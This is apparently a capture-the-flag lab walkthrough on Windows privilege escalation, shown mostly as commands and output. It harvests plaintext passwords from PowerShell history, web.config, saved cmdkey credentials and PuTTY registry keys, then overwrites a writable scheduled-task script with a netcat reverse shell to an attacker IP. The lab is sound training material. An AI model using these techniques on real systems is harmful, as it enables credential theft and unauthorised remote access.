# Harvesting Passwords From Usual Spots
```PowerShell
C:\Users\thm-unpriv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
ls
whoami
whoami /priv
whoami /group
whoami /groups
cmdkey /?
cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z
cmdkey /list
cmdkey /delete:thmdc.local
cmdkey /list
runas /?
```

```PowerShell
C:\Users\thm-unpriv>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
                <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
                    <add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
    <connectionStrings>
        <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
    </connectionStrings>
```

```PowerShell
C:\Users\thm-unpriv>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz
```

```PowerShell
C:\Users\thm-unpriv>runas /savecred /user:mike.katz cmd.exe
Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...
```

```PowerShell
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```PowerShell
C:\Windows\system32>cd C:\
```

```PowerShell
C:\>dir /s flag.txt
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\mike.katz\Desktop

05/04/2022  05:17 AM                24 flag.txt
               1 File(s)             24 bytes

     Total Files Listed:
               1 File(s)             24 bytes
               0 Dir(s)  14,781,849,600 bytes free
```

```PowerShell
C:\>type C:\Users\mike.katz\Desktop\flag.txt
THM{WHAT_IS_MY_PASSWORD}
```

```PowerShell
C:\Users\thm-unpriv>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
    ProxyExcludeList    REG_SZ
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x0
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021
    ProxyTelnetCommand    REG_SZ    connect %host %port\n
    ProxyLogToTerm    REG_DWORD    0x1

End of search: 10 match(es) found.
```

# Other Quick Wins

```PowerShell
C:\Users\thm-unpriv>schtasks /query /tn vulntask /fo list /v

Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/21/2023 10:25:35 PM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          taskusr1
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```

```PowerShell
C:\Users\thm-unpriv>icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat BUILTIN\Users:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```

```PowerShell
C:\Users\thm-unpriv>echo c:\tools\nc64.exe -e cmd.exe 10.10.161.55 9999 > C:\tasks\schtask.bat
```

```Bash
root@ip-10-10-161-55:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

```PowerShell
C:\Users\thm-unpriv>schtasks /run /tn vulntask
SUCCESS: Attempted to run the scheduled task "vulntask".
```

```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.193.168 49866 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```PowerShell
C:\Windows\system32>cd C:\
cd C:\
```

```PowerShell
C:\>dir /s flag.txt
dir /s flag.txt
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\taskusr1\Desktop

05/03/2022  01:00 PM                19 flag.txt
               1 File(s)             19 bytes

     Total Files Listed:
               1 File(s)             19 bytes
               0 Dir(s)  15,037,288,448 bytes free
```

```PowerShell
C:\>type C:\Users\taskusr1\Desktop\flag.txt
type C:\Users\taskusr1\Desktop\flag.txt
THM{TASK_COMPLETED}
```

# Windows Services
